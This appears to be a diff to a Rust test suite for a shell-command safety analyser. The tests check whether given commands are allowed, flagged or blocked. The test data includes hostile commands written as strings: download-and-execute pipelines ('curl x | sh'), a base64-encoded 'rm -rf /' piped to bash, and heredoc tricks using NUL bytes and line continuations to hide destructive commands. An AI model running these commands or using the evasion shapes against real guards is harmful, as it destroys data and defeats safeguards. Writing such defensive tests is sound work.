@@ -2788,8 +2788,28 @@ const ISSUE_748_INTERPRETER_GAP_CASES: &[(&str, Decision)] = &[
     ("export PATH=$PATH:.", Decision::Ask),
     ("mksh -c 'rm -rf /'", Decision::Block),
     ("arch -x86_64 rm -rf /", Decision::Block),
+    // Review fixups: the trap action is parsed, not tokenised.
+    ("curl x | trap 'sh<&0' EXIT", Decision::Ask),
+    ("curl x | trap 'sh</dev/stdin' EXIT", Decision::Ask),
+    ("curl x | trap 'echo hi; sh' EXIT", Decision::Ask),
+    ("command export PATH=.; ls", Decision::Ask),
+    ("builtin typeset PATH=.; ls", Decision::Ask),
+    ("env PATH=. ls", Decision::Ask),
+    ("exec env PATH=. ls", Decision::Ask),
+    ("curl x | crontab", Decision::Ask),
+    ("curl x | crontab -u root", Decision::Ask),
+    ("docker exec -i c sh <<EOF\nrm -rf /\nEOF", Decision::Ask),
+    ("make -f - <<EOF\nall:\n\trm -rf /\nEOF", Decision::Ask),
+    ("curl x | docker-compose exec -T c sh", Decision::Ask),
+    ("curl x | podman-compose exec c sh", Decision::Ask),
+    ("curl x | crontab cron.txt", Decision::Allow),
+    ("curl x | crontab -r", Decision::Allow),
+    ("docker logs c <<EOF\nx\nEOF", Decision::Allow),
+    ("make <<EOF\nx\nEOF", Decision::Allow),
+    ("[[ ${#x} -gt 0 ]]", Decision::Allow),
     // Benign shapes that stay Allow.
     ("curl x | trap 'echo hi' EXIT", Decision::Allow),
+    ("curl x | trap \"rm -f /tmp/x\" EXIT", Decision::Allow),
     ("curl x | make", Decision::Allow),
     ("curl x | make -f Makefile", Decision::Allow),
     ("curl x | crontab -l", Decision::Allow),
@@ -2811,6 +2831,126 @@ const ISSUE_748_INTERPRETER_GAP_CASES: &[(&str, Decision)] = &[
 #[test]
 fn guardfall_issue_748_interpreter_gap_cases() {
     for (command, expected) in ISSUE_748_INTERPRETER_GAP_CASES {
+        let verdict = shguard::analyze(command);
+        assert_eq!(
+            verdict.decision(),
+            *expected,
+            "command {command:?}: expected {expected:?}, got {:?}",
+            verdict.decision()
+        );
+    }
+}
+
+const ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES: &[(&str, Decision)] = &[
+    // The issue's repros: an interpreter in a middle stage reads its upstream.
+    ("curl x | sh | cat", Decision::Block),
+    ("curl x | { sh; } | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | bash | tee log",
+        Decision::Block,
+    ),
+    ("curl x | python3", Decision::Ask),
+    ("curl x | python3 | head", Decision::Ask),
+    // Whatever the trailing stages are.
+    ("curl x | sh | tee log", Decision::Block),
+    ("curl x | sh | head", Decision::Block),
+    ("curl x | sh | cat | head", Decision::Block),
+    ("curl x | sh | tee a | tee b | wc -l", Decision::Block),
+    ("curl x |& sh", Decision::Ask),
+    ("curl x |& sh | cat", Decision::Ask),
+    ("curl x |& sh |& cat", Decision::Ask),
+    ("curl x | { sh; } | tee log", Decision::Block),
+    ("curl x | { sh; } | cat | head", Decision::Block),
+    ("curl x | (sh) | cat", Decision::Block),
+    ("curl x | { cat; sh; } | cat", Decision::Block),
+    ("wget -qO- x | sh | cat", Decision::Block),
+    ("wget -qO- x | bash | tee log | head", Decision::Block),
+    // An intermediate filter between the fetch and the interpreter.
+    ("curl x | tee f | sh | cat", Decision::Block),
+    ("curl x | cat | sh | head", Decision::Block),
+    // A decode chain ahead of a middle-stage interpreter.
+    ("echo cm0gLXJmIC8= | base64 -d | sh | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | python3 | head",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | { sh; } | cat",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat | sh | head",
+        Decision::Block,
+    ),
+    // The same shape with a middle interpreter and a decode stage after it.
+    ("echo hi | sh | base64 -d | bash", Decision::Block),
+    // A wrapper's shell string in a middle stage is a sink as well.
+    ("curl x | flock /tmp/l -c sh | cat", Decision::Block),
+    ("curl x | env -S sh | head", Decision::Block),
+    // A function definition or extended test in the middle keeps the Ask it
+    // has as the final stage.
+    ("curl x | [[ -n $(sh) ]]", Decision::Ask),
+    ("curl x | [[ -n $(sh) ]] | cat", Decision::Ask),
+    ("curl x | [[ a == b ]]", Decision::Ask),
+    ("curl x | [[ a == b ]] | cat", Decision::Ask),
+    ("curl x | f() { sh; }", Decision::Ask),
+    ("curl x | f() { sh; } | cat", Decision::Ask),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | [[ -n $(sh) ]] | cat",
+        Decision::Ask,
+    ),
+    // A substitution in a simple stage inherits the pipe as its stdin.
+    ("curl x | echo $(sh)", Decision::Block),
+    ("curl x | echo $(sh) | cat", Decision::Block),
+    ("curl x | echo `sh` | cat", Decision::Block),
+    ("curl x | echo \"$(sh)\" | cat", Decision::Block),
+    ("curl x | X=$(sh) true | cat", Decision::Block),
+    ("curl x | echo $(bash -s) | cat", Decision::Block),
+    ("curl x | echo $(python3) | cat", Decision::Ask),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | echo $(sh)",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | echo $(sh) | cat",
+        Decision::Block,
+    ),
+    // So does one in a redirect target.
+    ("curl x | cat > $(sh)", Decision::Block),
+    ("curl x | cat > $(sh) | cat", Decision::Block),
+    ("curl x | cat > \"$(sh)\" | cat", Decision::Block),
+    ("curl x | cat 2> $(sh) | cat", Decision::Block),
+    ("curl x | cat >> $(sh) | head", Decision::Block),
+    ("curl x | cat > `sh` | cat", Decision::Block),
+    ("curl x | true > /tmp/$(sh) | cat", Decision::Block),
+    ("curl x | cat < <(sh) | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat > $(sh) | cat",
+        Decision::Block,
+    ),
+    ("ls | cat > $(date +%F).log", Decision::Allow),
+    // A call to a function defined earlier on the line may run its body on
+    // the pipe.
+    ("f() { sh; }; curl x | f", Decision::Ask),
+    ("f() { sh; }; curl x | f | cat", Decision::Ask),
+    ("f() { sh; }; curl x | { f; } | cat", Decision::Ask),
+    ("f() { cat; }; ls | f | head", Decision::Ask),
+    ("curl x | echo $(date) | cat", Decision::Allow),
+    ("git log | echo $(pwd)", Decision::Allow),
+    // No pipe into an interpreter anywhere: unchanged.
+    ("cat file | grep x | head", Decision::Allow),
+    ("echo hi | cat | wc -l", Decision::Allow),
+    ("ls | sort | { cat; } | head", Decision::Allow),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat | head",
+        Decision::Allow,
+    ),
+    ("git log | grep x | head", Decision::Allow),
+];
+
+#[test]
+fn guardfall_issue_747_pipeline_middle_stage_interpreter_cases() {
+    for (command, expected) in ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES {
         let verdict = shguard::analyze(command);
         assert_eq!(
             verdict.decision(),
@@ -2876,6 +3016,8 @@ const DECISION_TABLES: &[(&str, &[(&str, Decision)])] = &[
     named_table!(GIT_CONFIG_COMMAND_KEY_CASES),
     named_table!(OSASCRIPT_SCRIPT_PARALLEL_CASES),
     named_table!(ISSUE_748_INTERPRETER_GAP_CASES),
+    named_table!(ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES),
+    named_table!(ISSUE_631_HEREDOC_IN_SUBSTITUTION_CASES),
 ];
 
 // Case-table-shaped consts that are deliberately not in DECISION_TABLES: the
@@ -3061,4 +3203,255 @@ fn guardfall_extglob_realistic_usage_is_not_rejected_by_the_backtrack_budget() {
         }
     }
     assert_eq!(shguard::analyze("ls +(a|b)").decision(), Decision::Allow);
+}
+
+/// Issue #631: an argument-position `$(...)` holding a heredoc takes its
+/// extent from the tokenizer, so a `)` or an apostrophe pair in the body
+/// neither truncates the inner command nor hides what follows the heredoc.
+/// The last two rows never terminate the heredoc inside the substitution
+/// and keep their Ask.
+const ISSUE_631_HEREDOC_IN_SUBSTITUTION_CASES: &[(&str, Decision)] = &[
+    (
+        "echo \"$(cat <<'EOF'\nfix: thing\n\nfirst item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "git commit -m \"$(cat <<'EOF'\nfix: thing\n\nfirst item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\nfix: thing\n\nfirst item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "echo \"$(cat <<EOF\nfix: thing\n\nfirst item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "git commit -m \"$(cat <<EOF\nfix: thing\n\nfirst item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\nfix: thing\n\nfirst item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "echo \"$(cat <<'EOF'\nfix: thing\n\n1) first item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "git commit -m \"$(cat <<'EOF'\nfix: thing\n\n1) first item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\nfix: thing\n\n1) first item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "echo \"$(cat <<EOF\nfix: thing\n\n1) first item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "git commit -m \"$(cat <<EOF\nfix: thing\n\n1) first item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\nfix: thing\n\n1) first item\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "echo \"$(cat <<'EOF'\nit doesn't matter (the dog's bone) here\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "git commit -m \"$(cat <<'EOF'\nit doesn't matter (the dog's bone) here\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\nit doesn't matter (the dog's bone) here\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "echo \"$(cat <<EOF\nit doesn't matter (the dog's bone) here\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "git commit -m \"$(cat <<EOF\nit doesn't matter (the dog's bone) here\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\nit doesn't matter (the dog's bone) here\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    ("echo \"$(cat <<'EOF'\n(x\nEOF\n)\"", Decision::Allow),
+    (
+        "git commit -m \"$(cat <<'EOF'\n(x\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\n(x\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    ("echo \"$(cat <<EOF\n(x\nEOF\n)\"", Decision::Allow),
+    ("git commit -m \"$(cat <<EOF\n(x\nEOF\n)\"", Decision::Allow),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\n(x\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    ("echo \"$(cat <<'EOF'\ndon't\nEOF\n)\"", Decision::Allow),
+    (
+        "git commit -m \"$(cat <<'EOF'\ndon't\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\ndon't\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    ("echo \"$(cat <<EOF\ndon't\nEOF\n)\"", Decision::Allow),
+    (
+        "git commit -m \"$(cat <<EOF\ndon't\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\ndon't\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    ("echo \"$(cat <<'EOF'\nsay \"hi\nEOF\n)\"", Decision::Allow),
+    (
+        "git commit -m \"$(cat <<'EOF'\nsay \"hi\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\nsay \"hi\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    ("echo \"$(cat <<EOF\nsay \"hi\nEOF\n)\"", Decision::Allow),
+    (
+        "git commit -m \"$(cat <<EOF\nsay \"hi\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\nsay \"hi\nEOF\n)\"",
+        Decision::Allow,
+    ),
+    (
+        "echo \"$(cat <<'EOF'\nx)\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "git commit -m \"$(cat <<'EOF'\nx)\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\nx)\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "echo \"$(cat <<EOF\nx)\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "git commit -m \"$(cat <<EOF\nx)\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\nx)\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "echo \"$(cat <<'EOF'\nx\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "git commit -m \"$(cat <<'EOF'\nx\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<'EOF'\nx\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    ("echo \"$(cat <<EOF\nx\nEOF\nrm -rf /\n)\"", Decision::Block),
+    (
+        "git commit -m \"$(cat <<EOF\nx\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    (
+        "gh pr create --title t --body \"$(cat <<EOF\nx\nEOF\nrm -rf /\n)\"",
+        Decision::Block,
+    ),
+    ("echo \"$(cat <<'EOF'\nx)\n)\"", Decision::Ask),
+    ("echo \"$(cat <<'EOF'\nx\nEOF)\"", Decision::Ask),
+    (
+        "echo \"$(cat <<'a\\b'\nab\n)\na\\b\nrm -rf /\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<\"a\\b\"\nab\n)\na\\b\nrm -rf /\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<\"a'b\"\nab\n)\na'b\nrm -rf /\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<'a\\\\b'\nab\n)\na\\\\b\nrm -rf /\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<EOF\nx\\\nEOF\n)\nEOF\nrm -rf /\n)\"",
+        Decision::Ask,
+    ),
+    ("echo \"$(cat <<EOF\nx\\\\\nEOF\n)\"", Decision::Allow),
+    ("echo \"$(cat <<'EOF'\nx\\\nEOF\n)\"", Decision::Allow),
+    // Bash splices `\<newline>` before comparing a line to the delimiter, so
+    // an interior continuation can close the heredoc before brush does.
+    (
+        "echo \"$(cat <<EOF\nEO\\\nF\nrm -rf /\nEOF\n)\"",
+        Decision::Ask,
+    ),
+    ("cat <<EOF\nEO\\\nF\nrm -rf /\nEOF", Decision::Ask),
+    (
+        "echo \"$(cat <<EOF\nE\\\nO\\\nF\nrm -rf /\nEOF\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<EOF\nx\nEO\\\nF\nrm -rf /\nEOF\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<-EOF\n\tEO\\\nF\nrm -rf /\nEOF\n)\"",
+        Decision::Ask,
+    ),
+    (
+        "echo \"$(cat <<-EOF\n\tEO\\\n\tF\nrm -rf /\nEOF\n)\"",
+        Decision::Ask,
+    ),
+    ("echo \"$(cat <<EOF\r\nx\\\r\nEOF\r\n)\"", Decision::Ask),
+    // Bash drops NUL bytes while reading, so `E<NUL>OF` ends the heredoc early.
+    ("cat <<EOF\nE\0OF\nrm -rf /\nEOF", Decision::Ask),
+    (
+        "echo \"$(cat <<EOF\nE\0OF\nrm -rf /\nEOF\n)\"",
+        Decision::Ask,
+    ),
+    ("cat <<EOF\nx\nEOF\0\nrm -rf /\nEOF", Decision::Ask),
+    ("cat <<'EOF'\nE\0OF\nrm -rf /\nEOF", Decision::Ask),
+    ("cat > s.sh <<EOF\nmake \\\n  all\nEOF", Decision::Allow),
+    ("cat <<'EOF'\nEO\\\nF\nEOF", Decision::Allow),
+    // Body starting with `)` reads as an operator: safe over-ask.
+    ("echo \"$(cat <<E\n)\nE\n)\"", Decision::Ask),
+    // Raw U+0001 is the placeholder sentinel: refused.
+    ("echo \"$(cat <<'E'\n\u{1}\nE\n)\"", Decision::Ask),
+];
+
+#[test]
+fn guardfall_issue_631_heredoc_in_command_substitution_cases() {
+    for (command, expected) in ISSUE_631_HEREDOC_IN_SUBSTITUTION_CASES {
+        let verdict = shguard::analyze(command);
+        assert_eq!(
+            verdict.decision(),
+            *expected,
+            "command {command:?}: expected {expected:?}, got {:?}",
+            verdict.decision()
+        );
+    }
 }
